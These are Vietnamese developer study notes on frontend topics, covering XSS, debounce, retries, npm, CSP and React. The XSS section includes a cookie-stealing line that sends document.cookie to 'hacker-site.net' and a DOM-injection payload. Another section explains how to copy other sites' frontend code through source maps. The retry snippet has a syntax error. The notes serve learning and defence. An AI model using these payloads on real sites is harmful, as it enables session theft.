# XSS
->*** Cách tránh khi input của người dùng hiển thị trên UI:
- Dùng textContent thay vì innerHTML là xong. innerHTML có thể bị XSS nên React đã đổi thành dangerouslySetInnerHTML, k nên dùng. 
- Input nhét vào url phải dùng encodeURIComponent để chuyển ký tự đặc biệt thành html entity trước là xong.
- Dùng thư viện chống XSS phía server: validator, express-validator, DOMPurify. Bản chất nó sẽ validate regexp email, sanitize string, convert sang html entities.

-> Reflected XSS: User login web có session cookies -> Hacker gửi 1 URL tới trang web đó nhưng tham số có chứa mã XSS -> người dùng truy cập vào URL đó thì gửi request tới server với mã XSS của hacker -> server xử lý và trả lại ngừoi dùng hiển thị ra màn hình. VD đoạn mã là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie; -> Browser hiển thị ra màn hình sẽ thực hiện script và gửi session cookie cho hacker.

-> Stored XSS: Hacker chèn script độc hại, server lưu vào database -> nạn nhân đăng nhập vào web như thường, lấy data từ db có đoạn XSS script về thực thi là toang

-> DOM Based XSS: giống reflected XSS nhưng 1 cái gửi lên server, 1 cái sửa DOM
Hacker lừa người dùng truy cập vào URL của 1 trang web để đăng nhập là: http://example.com/register.php?message=Please fill in the form
Nhưng hacker lại gửi: http://example.com/register.php?message=<label>Gender</label><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select> <script>function show(){alert("hacked");}</script>
=> Dòng please fill in the form biến thành 1 input gender vì browser nó render html như v, khi người dùng kb vào chọn gender thì script được thực thi



# Dùng debounce throttle
Debounce trigger liên tục mãi mãi sẽ kbh chạy hàm, throttle đảm bảo hàm chạy luôn lần sau trigger cách lần trước đủ tg sẽ đảm bảo chạy tiếp.

-> throttle: Giới hạn số lần gọi hàm trong 1 ktg. VD ta có thể set là "Bất cứ 10s liên tiếp nào cũng k có quá 1 lần gọi hàm này"
VD: thg dung trong game khi người dùng ấn bắn chiêu nhanh đến mấy thì vẫn bắn 1s 1 phát đạn chẳng hạn
function throttle(func, delay) {
  let lastCallTime = 0;
  return function (...args) {
    const currentTime = Date.now();
    if (currentTime - lastCallTime >= delay) {
      lastCallTime = currentTime;
      func.apply(this, args);
    }
  };
}
const throttledFunction = throttle(() => {
  console.log('Function throttled!');
}, 500);
throttledFunction();

-> debounce: trigger sẽ k thực hiện ngay mà delay 1 ktg kể từ lần cuối cùng hàm được gọi.
VD: khi đổi kích thước màn hình or scroll thì chạy hàm gì đó nhưng các sự kiện đó thg được tự trigger quá nhiều, dùng debounce cho đỡ lag
VD: tính năng search khi gõ liên tục sẽ chỉ tự thực hiện sau khi gõ xong
function debounce(func, delay) {
  let timeoutId;
  return function (...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      func.apply(this, args);
    }, delay);
  };
}
const debouncedFunction = debounce(() => {
  console.log('Function debounced!');
}, 500);
debouncedFunction();



# Tạo safe triangle cho context menu
Giải thích: https://www.smashingmagazine.com/2023/08/better-context-menus-safe-triangles/
Cơ chế xử lý sự kiện mouse enter và mouse leave. Mỗi khi move sẽ check vị trí mouse trong hình tam giác cũ thì tạo tam giác mới, ngoài hình tam giác cũ thì disable pointer-event là xong.
Có thể implement thêm safe triangle thì chuột bị di chậm hoặc đứng yên cũng tự tắt.



# Dùng retryable
BE nên dùng retryable khi call api qtr và db, đặc biệt là call by batch.
BE call tới db cũng nên tận dùng transaction để gom batch update 1 lần.
FE ít khi dùng retryable, mà nếu lỗi thì call lại cũng khó thành công, thường sẽ show lỗi cho người dùng. FE chỉ nên dùng cho các API quan trọng gọi tới bên thứ 3, khi polling liên tục, khi dùng socket muốn reconnect khi mất kết nối. Rút exp là k retry khi lỗi mạng vì lỗi mạng là mất mạng thì retry làm gì, VD lỗi server trả hết access token thì retry.
FE retryable thường triển khai qua interceptors của axios
FE retryable triển khai qua fetch thì cứ check response.ok là error của server, try catch throw khi bị error network, invalid input from client, cors thì check lỗi network thôi.

Nên giới hạn retry 3s max 5 lần. Chưa tốt vì nếu nhiều người dùng cùng lúc, tự dưng sập và mọi request tại thời điểm đó bị lỗi và retry đồng thời mỗi 3s, thì kể từ đó, mỗi 3s thì số lượng request trùng lặp dần tăng lên trong 5 lần kế.
Giải pháp là cộng thêm 1 số random ở mỗi lần để sleep. Chưa tốt vì ktg ngắn thì xs lặp lại lỗi cũ cao, phải dùng exponential backoff là các lần sau request sẽ phải chờ lâu hơn các lần trước. VD khi nhập mật khẩu, nhập sai càng nhiều sẽ chờ càng lâu hơn lần trước đó.

VD càng sai càng chờ lâu, liên tục trong 3 lần, cộng 1 khoảng random từ 0->1s:
static async fetchWithRetry(url, errorCount = 0) => {
  const ERROR_COUNT_MAX = 3;
  const response = await fetch(url);
  if(response.status < 200 || response.status >= 300) { // Chỉ lỗi mạng mới retry
    // Log lỗi 
    if(errorCount < ERROR_COUNT_MAX){
      await new Promise(r => setTimeout(r, Math.pow(2, errorCount)*3000 + Math.random()*1000));
      await this.fetchWithRetry(url, errorCount + 1);
    }
  }
}



# Chia cấu trúc dự án lớn
Quan trọng là nhìn vào giao diện biết tìm ở file nào, nhìn vào file nào biết nằm ở đâu trên giao diện. 1 người mới toanh nhìn vào là hiểu luôn.
VD ta cần tìm trong trang finance, trong 1 mục X, có cái dropdown => Phải tìm trong pages/finance/X/index.js. Dropdown là 1 component chung nhưng chỉ dùng ở finance thì nên chia kiểu src/common/finance/dropdown/index.js hoặc src/apps/finance/common/dropdown/index.js

VD chuẩn là chia theo chức năng, mỗi chức năng sẽ chia theo cấu trúc từng module UI:
src (folder)
  api (folder)
    calling (folder) => call API cho calling
    powerplatform (folder) => call API cho powerplatform
    helpers (folder) => enum, utility liên quan tới API
  app (folder)
    common (folder) => common component
    structure (folder) => component kiểu loading, error, headers, router => chức năng
    pages (folder) => chức năng
      calling (folder) => module UI
        common (folder) => common components của calling
        callingpolicy => component trong calling policy. Chia theo cấu trúc UI
        callqueues => component trong callqueues
      powerplatform (folder)
    index.js
    index.css
  redux (folder)
    actions (folder)
      calling
      powerplatforms 
    reducers (folder)
      calling
      powerplatforms
    store (folder)
  hookes (folder)
    react-query (folder)
    contracts (folder)
    common (folders)
  util (folder) => chứa các utility chung
  model (folder) => chứa interface, type, struct
  context (folder)
  index.html
  index.js
=> Với dự án nhỏ thì có thể k cần chia folder lớn cho từng module như v mà chỉ có 1 file, thì file nên có tên module để nhìn phát biết dùng cho module nào, hoặc viết 1 file common dùng cho mọi module.
Trong 1 file component có: propsType  defaultProps  utilities  Component



# Dựng server nodejs serve react app
Giả sử công ty lớn cần thêm các header bảo mật khi người dùng vào web react, có thể dựng 1 server nodejs custom để serve.
Đầu tiên build app react set outDir ra 1 thư mục có file index.html -> dựng 1 server expressjs config route để serve file index.html đó -> Tuỳ ý tạo middleware thêm các header bảo mật. Có thể tạo các biến số trong file index.html để thế vào từ server, VD các url phân tách môi trường, SSL key, login SSO -> thay lệnh chạy react bằng lệnh chạy nodejs.
Có thể dựng nginx để set header.
Chú ý họ chỉ cần thêm header bảo mật của request lấy file index.html. Còn các API query data thì k cần, API đó có access token bảo mật riêng klq. Khi ta set header cho query GET index.html, browser lấy xong index.html này sẽ lấy các file js, css liên quan thì sẽ tự thêm các header cũ mà k cần xử lý gì thêm.

Thêm từ BE: res.setHeader trong middleware, package helmet, nginx
Thêm từ FE: <meta http-equiv="Content-Security-Policy" content="default-src 'self'"> => chỉ có tác dụng sau khi html được tải
VD Nếu web dùng CDN thì phải mở thêm quyền: <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://cdn.jsdelivr.net">



# Progressive enhancement
Là 1 pp phát triển website bắt đầu cơ bản trước với content thiết yếu. Rồi nâng cấp dần như thêm css, js cho những người sử dụng trình duyệt hiện đại hơn dùng được (nếu hỗ trợ các tính năng đó). Còn những người dùng trình duyệt cũ vẫn đầy đủ tính năng basic.
Phải ưu tiên dùng HTML và CSS thuần để đảm bảo sự tương thích. JS dược dùng để thêm tính năng nâng cao, nhưng nếu JS k khả dụng or bị tắt thì vẫn k gián đoạn trải nghiệm cơ bản.
=> Các thư viện có tính chất progressive enhancement phải có các tính chất đó. Nếu không nó có thể không tương thích với một số trình duyệt cũ hoặc khi k hỗ trợ JS.



# package.json
npx khi cần dùng package mà k cài vào máy
npm cài package vào máy và dùng
pnpm như npm nhưng tiết kiệm mem hơn
yarn như npm nhưng cache tốt hơn

-> yarn add [package]@[version-or-tag] / npm i package-name@version => Cài version xác định
yarn upgrade <package> => Upgrade lên mới nhất

-> 3 cái --dev / --peer / -optional thêm vào cuối nếu specific với 3 loại dev dependencies, peer dependencies and optional dependencies.
--save sẽ lưu vào dependencies chính
--save-dev lưu package vào devDependencies, viết tắt là -D. 
Khi chạy npm install --production thì các package trong devDependencies sẽ k đc install

-> Sửa package có sẵn
C1: Ta có thể fork repo package về git của mình và sửa, sau đó sửa đổi file package.json thay số phiên bản bằng "git+<url repo>". 
Trang https://gitpkg.vercel.app/ cho phép nhận link github ra câu lệnh npm.
C2: sửa đổi trực tiếp trong node_modules r chạy: npx patch-package <package name> thì nó sẽ yêu cầu cài package patch và tạo ra thư mục patches chứa package ta đã sửa r dùng bth
=> nếu ta xóa node_modules và cài lại thì có thể phải làm lại nên thêm lệnh: "postinstall": "npx patch-package" vào script để tự render theo thay đổi của ta khi install lại

-> package.json sẽ override version trong package-lock.json
VD package A dùng package B ^2.3.0, nhưng về sau họ ra bản 2.3.1 thì do có ^ nên gói tự động tải 2.3.1 nhưng 2.3.1 lại hoạt động k đúng với ứng dụng nx. Để đảm bảo khi người ta pull cái repo package đó về thì phiên bản chuẩn y hệt như lúc ta tạo ra package đó thì nó lưu vào package-lock.json
Trong package-lock.json sẽ hiển thị ra module trong package.json kèm theo 1 list các child package đi kèm với nó được fix version để đảm bảo với version đó của package đó thì các dependencies con phải luôn đúng phiên bản này.
VD package A dùng C và B, trong package B lại dùng C và 2 cái C có phiên bản khác nhau là bth. Nó sẽ tải cả 2 phiên bản về nhưng nếu trùng nhau thì nó tự chỉ tải 1 lần 

-> Lệnh: npm bin -g => hiện url hiển thị các package global đã cài đặt
npm run --prefix <path> <script> => run npm ở directory khác từ cmd ở thư mục hiện đại

-> npm run eject => Lệnh 1 chiều k dùng tuỳ tiện, làm cho bundler không còn tự động hóa mọi vấn đề nữa mà sẽ bung toàn bộ config để những dev có thể config lại tuỳ ý. 

-> Lỗi: npm run build dự án react ra file index.html nhưng khi vào chỉ có 1 trang trắng. NN vì webpack config bản production thì build vào path "/" tức absolute tìm trong application chứ kp trong application/build. 
=> Fix bằng cách thêm vào package json "homepage":"." để chỉ định tải các file static của dự án với url là relative trong thư mục hiện tại là application/build
VD: custom "homepage": "./test", thì nhét thư mục static vào folder test cùng cấp là lại chạy được



# Cách clone code frontend của các trang web
Compiler optimize source code FE thành file chunk, chạy lên browser rất khó debug nên cần file source map để browser tái tạo lại code gốc. Có thể config webpack để ẩn source map nhưng sẽ khó debug, nên nó được bật theo mặc định. Đa phần các trang web dùng các js framework bundle file nếu vẫn giữ source map có thể lấy được phần frontend static file, web CSR.

Vào browser devtool -> Sources -> tìm mở các file chunk rồi click chuột phải vào file đang mở -> Add source map: <tên file>.map -> làm với mọi file js thì sẽ thấy được source code frontend đầy đủ -> Dùng extension resources saver -> click mọi option trừ cái XHR để tránh quá lớn -> Ấn tải về
Tạo 1 dự án mới với công nghệ tương ứng và add các file vào src, config tùy chỉnh -> Thêm các thư viện đầy đủ đúng phiên bản, nếu phiên bản k chạy được thì phải tự downgrade xuống, khá khó nhất là với web k dùng react -> Thêm các file css vào dự án vẫn có trong mục tải về -> 1 số resources assets không hoạt động phải tự vào trang web gốc tải về. K tìm được thì chịu.
=> Ở bước add source map là ta đang thêm source map của file js đó để browser tái tạo lại code gốc. Tool tìm file source map nếu có: https://sourcemaps.io/



# Virtual DOM in React
React là chỉ render lại các phần cần thiết. Trong actual DOM của html thuần, k có cách nào xđ được element nào thực sự thay đổi để render lại mà phải load cả cây DOM. 
Do đó React dùng virtual dom là 1 bản giống hệt DOM thật nhưng nó rẻ hơn vì k phải render ra màn hình. Dùng virtual dom có thể xác định các phần thay đổi để chỉ render lại component đó thôi. Khi ta log thẻ jsx ra type Symbol react.element lồng các con liên tiếp thì chính là virtual DOM đó. 
Cơ chế: khi chạy, virtual dom sẽ được tạo và lưu trong memory, nếu có update thì React sẽ tự tạo 1 cây virtual dom mới, virtual dom k render lên screen nên tạo rất dễ. Sau đó React compare 2 cây DOM xem khác nhau chỗ nào và tiến hành update phần node đó trên actual dom.
Khi thực hiện thuật toán tìm điểm khác biệt, react so sánh 2 snapshot của root element, giống nhau thì tiếp tục so sánh dần xuống con để xác định node cần.

-> React dùng Synthetic Event: https://reactjs.org/docs/events.html
React wrap native browser event vào 1 cái wrapper có interface, bên trong cung các method như preventDefault() để sử dụng. NN dùng wrapper chung là để đồng bộ xử lý sự kiện trên các browser khác nhau. Tức các sự kiện ta trigger như onClick, onBlur là ReactJS custom event (Synthetic Event) chứ kp real dom event. Nhờ đó dễ dàng tạo ra cross browser app



# Xây 1 ứng dụng hỗ trợ hỏi đáp AI, dựa trên tập data từ SQL
URL: https://www.freecodecamp.org/news/talk-to-databases-using-ai-build-a-sql-query-data-extractor/ 
Dùng GroqAI cho AI model train với data rồi tương tác qua API bằng CopilotKit, sẽ tự động xử lý NLP và mọi thứ chuyên cho chat.
=> Các ứng dụng AI khác cũng xây theo quy trình tương tự



# Other:
-> Lỗi npm node-gyp trong window: Khi cài 1 package sẽ biên dịch package đó. VD cài truffle thì máy phải có python và C mới npm i được và phải cài đúng phiên bản. Điều này rất khó nếu như ta cài thủ công python và C++ không rõ phiên bản nào hỗ trợ chuẩn, xong còn phải thêm environment var.
=> Fix với powershell quyền admin: npm i -g --production windows-build-tools => Tự cài các tool hỗ trợ mặc định trong window là python và C++, -g để thêm env var luôn

-> Lỗi: This site can’t provide a secure connection. Localhost sent an invalid response => do giao thức HSTS yêu cầu mọi kết nối tới web phải được mã hóa bằng HTTPS.
=> Fix trên chrome thì vào chrome://net-internals/#hsts => trong Delete domain security policies gõ localhost là xong
=> Fix trên edge tương tự vào: edge://net-internals/#hsts

-> ReactDOMServer dùng cho SSR có hàm render biến tất cả component react thành thẻ html dưới dạng string r nhét vào res.write("") gửi cho client, còn có hàm hydrate để dùng trong TH server gửi lại html tĩnh thì client React sẽ hydrate => k dùng
React19 hỗ trợ ssr trực tiếp nhưng thà dùng nextjs hơn.

-> Ngoài folder src dùng CommonJS require, files trong src dùng ES6 import. Có thể cấu hình package Browsify để FE dùng CommonJS, còn Babel giúp NodeJS dùng ES6 được.
Trong HTML thuần ta dùng được export và import như v thì file export phải được script vào file html dưới dạng module nhưng trong React config hết r nên k cần.


